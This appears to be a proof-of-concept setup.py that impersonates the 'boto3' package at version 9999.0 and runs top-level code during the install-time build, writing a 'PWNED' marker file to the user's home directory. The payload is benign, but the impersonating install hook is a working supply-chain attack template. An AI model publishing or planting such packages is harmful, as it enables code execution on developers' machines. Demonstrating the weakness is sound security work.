from setuptools import setup

# runs whenever setup.py is executed → i.e. when uv builds this sdist at install time
import os, datetime
print("=== PoC: install-time exec via sdist build ===")
with open(os.path.expanduser("~/PWNED_boto3_install.txt"), "w") as f:
    f.write(f"install-time code exec @ {datetime.datetime.now()}\n")

setup(name="boto3", version="9999.0", packages=["boto3"])